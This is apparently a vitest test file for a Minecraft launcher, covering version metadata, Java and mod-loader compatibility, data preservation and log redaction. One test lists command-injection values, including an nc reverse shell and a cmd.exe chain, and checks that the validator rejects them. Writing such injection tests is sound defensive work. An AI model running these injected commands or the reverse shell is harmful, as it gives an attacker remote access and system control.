import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';
import { FernPathManager } from '../launcher/src/core/paths';
import { FernLogger } from '../launcher/src/core/logger';
import { SettingsManager } from '../launcher/src/settings/settings-manager';
import { InstallationManager } from '../launcher/src/installations/installation-manager';
import { ProfileManager } from '../launcher/src/installations/profile-manager';
import { AccountManager } from '../launcher/src/accounts/account-manager';
import { VersionService } from '../launcher/src/versions/version-service';
import { CompatibilityEngine } from '../launcher/src/compatibility/compatibility-engine';
import { LaunchArgumentValidator } from '../launcher/src/core/launch-arguments';
import { UpdateService } from '../launcher/src/core/update-service';
import { DiagnosticsService } from '../launcher/src/core/diagnostics-service';
import { FernError, FernErrorCode } from '../launcher/src/core/errors';
import { BRANDING } from '../shared/constants/branding';

describe('Phase 21: Post-Launch Maintenance, Regression Prevention & Compatibility', () => {
  let tmpDir: string;
  let pathManager: FernPathManager;
  let logger: FernLogger;

  beforeEach(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'fern-phase21-test-'));
    pathManager = new FernPathManager(tmpDir);
    await pathManager.initializeDirectories();
    logger = new FernLogger(pathManager);
    logger.setLogLevel('ERROR');
  });

  afterEach(async () => {
    try {
      await fs.rm(tmpDir, { recursive: true, force: true });
    } catch {
      // Ignore temp dir cleanup errors
    }
  });

  // =========================================================================
  // 1. Application Startup & Initialization Scaffolding
  // =========================================================================
  describe('Application Startup & Directory Scaffolding', () => {
    it('initializes all required application directories cleanly on first startup', async () => {
      const versionsDir = pathManager.getVersionsDir();
      const assetsDir = pathManager.getAssetsDir();
      const librariesDir = pathManager.getLibrariesDir();
      const installationsDir = pathManager.getInstallationsDir();
      const logsDir = pathManager.getLogsDir();

      const checkDir = async (dir: string) => {
        const stat = await fs.stat(dir);
        return stat.isDirectory();
      };

      expect(await checkDir(versionsDir)).toBe(true);
      expect(await checkDir(assetsDir)).toBe(true);
      expect(await checkDir(librariesDir)).toBe(true);
      expect(await checkDir(installationsDir)).toBe(true);
      expect(await checkDir(logsDir)).toBe(true);
    });
  });

  // =========================================================================
  // 2. Minecraft Version Manifest & Metadata Handling
  // =========================================================================
  describe('Minecraft Version Metadata & Resilience', () => {
    it('VersionService: utilizes embedded fallback manifest when network and disk cache are unavailable', async () => {
      const versionService = new VersionService(pathManager, logger);

      // Force network error and missing disk cache by passing nonexistent paths
      const manifest = await versionService.getManifest();
      expect(manifest).toBeDefined();
      expect(manifest.versions.length).toBeGreaterThan(0);

      // Check key LTS versions are represented
      const versionIds = manifest.versions.map((v) => v.id);
      expect(versionIds).toContain('1.21.4');
      expect(versionIds).toContain('1.20.1');
      expect(versionIds).toContain('1.16.5');
    });

    it('VersionService: cleans up corrupted version JSON from disk and throws validation error for unknown versions', async () => {
      const versionService = new VersionService(pathManager, logger);
      const versionsDir = pathManager.getVersionsDir();

      // Write corrupt json for version 1.21.4
      const vDir = path.join(versionsDir, '1.21.4');
      await fs.mkdir(vDir, { recursive: true });
      const corruptJson = path.join(vDir, '1.21.4.json');
      await fs.writeFile(corruptJson, '{ "corrupt_partial_json": true, ...');

      // Attempting to query an invalid/unknown version throws typed FernError
      await expect(versionService.getVersionPackage('nonexistent-mc-version')).rejects.toThrow(
        FernError
      );

      // getVersionPackage detects parse failure, unlinks corrupted file, and heals cache with valid JSON
      const pkg = await versionService.getVersionPackage('1.21.4');
      expect(pkg).toBeDefined();
      expect(pkg.id).toBe('1.21.4');

      const raw = await fs.readFile(corruptJson, 'utf-8');
      expect(raw).not.toContain('corrupt_partial_json');
      const parsed = JSON.parse(raw);
      expect(parsed.id).toBe('1.21.4');
    });
  });

  // =========================================================================
  // 3. Java Discovery & Compatibility Verification
  // =========================================================================
  describe('Java Discovery & Version Compatibility Matrix', () => {
    const engine = new CompatibilityEngine();

    it('validates Minecraft 1.21.4 requires Java 21 LTS and rejects older Java runtimes', () => {
      // Valid Java 21
      const validReport = engine.evaluate({
        minecraftVersion: '1.21.4',
        javaMajorVersion: 21,
        loader: 'vanilla',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(validReport.isPlayable).toBe(true);
      expect(validReport.overallStatus).toBe('compatible');

      // Incompatible Java 17 for 1.21.4
      const invalidReport = engine.evaluate({
        minecraftVersion: '1.21.4',
        javaMajorVersion: 17,
        loader: 'vanilla',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(invalidReport.isPlayable).toBe(false);
      expect(invalidReport.overallStatus).toBe('incompatible');
      const javaIssue = invalidReport.issues.find((i) => i.code === 'JAVA_21_REQUIRED');
      expect(javaIssue).toBeDefined();
      expect(javaIssue?.isFatal).toBe(true);
    });

    it('validates Minecraft 1.20.1 requires Java 17 and accepts Java 21', () => {
      const report17 = engine.evaluate({
        minecraftVersion: '1.20.1',
        javaMajorVersion: 17,
        loader: 'vanilla',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(report17.isPlayable).toBe(true);

      const report21 = engine.evaluate({
        minecraftVersion: '1.20.1',
        javaMajorVersion: 21,
        loader: 'vanilla',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(report21.isPlayable).toBe(true);
    });

    it('flags legacy Minecraft 1.16.5 running on modern Java with a non-fatal warning', () => {
      const legacyReport = engine.evaluate({
        minecraftVersion: '1.16.5',
        javaMajorVersion: 21,
        loader: 'vanilla',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(legacyReport.isPlayable).toBe(true);
      expect(legacyReport.overallStatus).toBe('warning');
      const warningIssue = legacyReport.issues.find((i) => i.code === 'LEGACY_JAVA_WARNING');
      expect(warningIssue).toBeDefined();
      expect(warningIssue?.isFatal).toBe(false);
    });
  });

  // =========================================================================
  // 4. Launch Preparation & Security Argument Validation
  // =========================================================================
  describe('Launch Preparation & Security Bounds', () => {
    it('validates memory flags and warns if allocation exceeds 85% of total system RAM', () => {
      // Safe allocation: 4GB out of 16GB
      const safeCheck = LaunchArgumentValidator.validateMemoryArgs(2048, 4096, 16384);
      expect(safeCheck.isValid).toBe(true);
      expect(safeCheck.warnings.length).toBe(0);

      // Dangerous allocation: 15GB out of 16GB (>85%)
      const dangerousCheck = LaunchArgumentValidator.validateMemoryArgs(2048, 15000, 16384);
      expect(dangerousCheck.warnings.some((w) => w.includes('85%'))).toBe(true);

      // Inverted allocation: min > max
      const invertedCheck = LaunchArgumentValidator.validateMemoryArgs(8192, 4096, 16384);
      expect(invertedCheck.isValid).toBe(false);
    });

    it('strictly rejects JVM argument injection containing command chaining delimiters', () => {
      const maliciousPatterns = [
        ['-Xmx4G', '& cmd.exe /c calc'],
        ['-Xmx4G', '| powershell.exe -c "Write-Host Evil"'],
        ['-Xmx4G', '; nc -e cmd.exe 10.0.0.1 4444'],
        ['-Xmx4G', '`reboot`'],
        ['-Xmx4G', '$MALICIOUS_ENV_EXPANSION'],
        ['-Xmx4G', '> overwritten_file.txt'],
      ];

      for (const args of maliciousPatterns) {
        const result = LaunchArgumentValidator.validateArgs(args);
        expect(result.isValid).toBe(false);
        expect(result.warnings.some((w) => w.includes('Forbidden special character'))).toBe(true);
      }
    });
  });

  // =========================================================================
  // 5. Supported Modded Launch Validation
  // =========================================================================
  describe('Mod Loader Compatibility', () => {
    const engine = new CompatibilityEngine();

    it('validates Fabric 0.16.x on Minecraft 1.21.4', () => {
      const report = engine.evaluate({
        minecraftVersion: '1.21.4',
        javaMajorVersion: 21,
        loader: 'fabric',
        loaderVersion: '0.16.9',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(report.isPlayable).toBe(true);
      expect(report.overallStatus).toBe('compatible');
    });

    it('validates NeoForge 21.x on Minecraft 1.21.4', () => {
      const report = engine.evaluate({
        minecraftVersion: '1.21.4',
        javaMajorVersion: 21,
        loader: 'neoforge',
        loaderVersion: '21.4.1',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(report.isPlayable).toBe(true);
      expect(report.overallStatus).toBe('compatible');
    });

    it('flags NeoForge as incompatible on Minecraft versions older than 1.20.2', () => {
      const report = engine.evaluate({
        minecraftVersion: '1.20.1',
        javaMajorVersion: 17,
        loader: 'neoforge',
        minRamMb: 2048,
        allocatedRamMb: 4096,
        totalSystemRamMb: 16384,
      });
      expect(report.isPlayable).toBe(false);
      expect(report.issues.some((i) => i.code === 'NEOFORGE_VERSION_UNSUPPORTED')).toBe(true);
    });
  });

  // =========================================================================
  // 6. User Data Preservation & Isolation
  // =========================================================================
  describe('User Data Preservation & Isolation', () => {
    it('preserves existing settings and custom profiles across launcher re-instantiation', async () => {
      const settings1 = new SettingsManager(pathManager, logger);
      await settings1.load();
      await settings1.updateSettings({
        appearance: { ...settings1.getSettings().appearance, theme: 'oled' },
      });

      const profileMgr1 = new ProfileManager(pathManager, logger);
      await profileMgr1.load();
      const p = await profileMgr1.createProfile({
        name: 'Speedrun Profile',
        installationId: 'vanilla-1-21-4',
        minecraftVersion: '1.21.4',
      });

      // Second launch simulation
      const settings2 = new SettingsManager(pathManager, logger);
      await settings2.load();
      expect(settings2.getSettings().appearance.theme).toBe('oled');

      const profileMgr2 = new ProfileManager(pathManager, logger);
      await profileMgr2.load();
      expect(profileMgr2.getProfile(p.id)?.name).toBe('Speedrun Profile');
    });

    it('ensures user saves, screenshots, and logs are never deleted or modified during launcher updates', async () => {
      const appDir = path.join(tmpDir, 'app-runtime');
      const screenshotsDir = path.join(tmpDir, 'screenshots');
      await fs.mkdir(appDir, { recursive: true });
      await fs.mkdir(screenshotsDir, { recursive: true });

      const userScreenshot = path.join(screenshotsDir, '2026-10-10_epic_build.png');
      await fs.writeFile(userScreenshot, 'MOCK_PNG_IMAGE_DATA');

      // Execute update service rollback snapshot on appDir
      const updateService = new UpdateService(pathManager, logger);
      await updateService.createRollbackSnapshot(appDir, '1.0.0');

      // Verify screenshot file is untouched
      const exists = await fs.access(userScreenshot).then(() => true).catch(() => false);
      expect(exists).toBe(true);
      const content = await fs.readFile(userScreenshot, 'utf-8');
      expect(content).toBe('MOCK_PNG_IMAGE_DATA');
    });
  });

  // =========================================================================
  // 7. Privacy, Diagnostics & Local Offline Operation
  // =========================================================================
  describe('Privacy & Diagnostic Redaction', () => {
    it('DiagnosticsService strips Bearer tokens, passwords, Windows user home directories, and IPs', () => {
      const rawLog = [
        'Connecting: Authorization Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token12345',
        'Database: connection_string=password=SecretDatabasePassword!&user=root',
        'Filesystem: C:\\Users\\MyWindowsAccount\\AppData\\Roaming\\Fern Client\\installations',
        'Remote: Contacted game server at 192.168.1.250:25565',
      ].join('\n');

      const clean = DiagnosticsService.sanitizeSensitiveText(rawLog);

      expect(clean).not.toContain('token12345');
      expect(clean).not.toContain('SecretDatabasePassword!');
      expect(clean).not.toContain('C:\\Users\\MyWindowsAccount');
      expect(clean).not.toContain('192.168.1.250');

      expect(clean).toContain('<REDACTED_TOKEN>');
      expect(clean).toContain('<REDACTED_PASSWORD>');
      expect(clean).toContain('<USER_DIR>');
      expect(clean).toContain('[REDACTED_IP]');
    });
  });
});
